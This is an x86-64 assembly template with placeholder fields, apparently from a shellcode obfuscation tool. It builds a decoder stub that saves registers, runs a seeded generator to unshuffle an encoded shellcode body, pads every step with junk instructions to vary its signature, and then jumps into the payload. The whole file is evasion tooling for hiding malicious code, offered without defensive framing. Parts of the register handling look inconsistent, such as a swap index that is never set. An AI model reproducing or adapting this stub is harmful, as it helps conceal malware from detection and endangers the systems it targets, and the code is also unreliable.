.code64

// iji means insert junk instruction
// ijs means insert junk instruction with short version

// rax store the seed
// rbx store the key
// rcx store the loop times
// rbp store the body address
// rsi store the swapped data
// rdi store the swapped offset

entry:
  // save context
  push {{.Reg.rax}}                            {{iji}}
  push {{.Reg.rbx}}                            {{iji}}
  push {{.Reg.rcx}}                            {{iji}}
  push {{.Reg.rbp}}                            {{iji}}
  push {{.Reg.rsi}}                            {{iji}}
  push {{.Reg.rdi}}                            {{iji}}
  pushfq                                       {{iji}}

  mov {{.Reg.rax}}, {{hex .Seed}}              {{iji}}
  mov {{.Reg.rbx}}, {{hex .Key}}               {{iji}}

  // prevent continuous 0x00
  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{iji}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{iji}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{iji}}

  // calculate the body address
  lea {{.Reg.rbp}}, [rip + body + {{hex .OffsetT}}]   {{iji}}
  add {{.Reg.rbp}}, {{hex .OffsetA}}                  {{iji}}
  sub {{.Reg.rbp}}, {{hex .OffsetS}}                  {{iji}}

  // unshuffle shellcode body
 loop_unshuffle:
  push {{.Reg.rcx}}

  // seed = seed * mul + inc
  mov {{.Reg.rcx}}, {{hex .Imm.Mul}}
  xor {{.Reg.rcx}}, {{.Reg.rbx}}
  imul {{.Reg.rax}}, {{.Reg.rcx}}

  mov {{.Reg.rcx}}, {{hex .Imm.Inc}}
  xor {{.Reg.rcx}}, {{.Reg.rbx}}
  add {{.Reg.rax}}, {{.Reg.rcx}}

  pop {{.Reg.rcx}}

  // calculate swapped
  shr {{.Reg.rax}}, 3

  sub rsp, 8

  push rax
  push rcx
  push rdx

  xor rdx, rdx
  mov rax, {{.Reg.rax}}
  mov rcx, {{.Reg.rcx}}
  div rcx

  mov [rsp+24], rdx

  pop rdx
  pop rcx
  pop rax

  mov {{.Reg.rdx}}, [rsp]
  add rsp, 8

  // swap data[i] and data[j]
  mov {{.Reg.al}}, [{{.Reg.rbp}} + {{.Reg.rsi}} ]
  xchg {{.Reg.al}},  [{{.Reg.rbp}} + {{.Reg.rdx}}]
  mov [{{.Reg.rbp}} + {{.Reg.rsi}}], {{.Reg.al}}


  // update counter
  dec {{.Reg.ecx}}                             {{iji}}
  jnz loop_unshuffle                           {{iji}}

  // restore context
  popfq                                        {{iji}}
  pop {{.Reg.rdi}}                             {{iji}}
  pop {{.Reg.rsi}}                             {{iji}}
  pop {{.Reg.rbp}}                             {{iji}}
  pop {{.Reg.rcx}}                             {{iji}}
  pop {{.Reg.rbx}}                             {{iji}}
  pop {{.Reg.rax}}                             {{iji}}

  jmp body                                     {{iji}}

body:
  // loader or raw shellcode
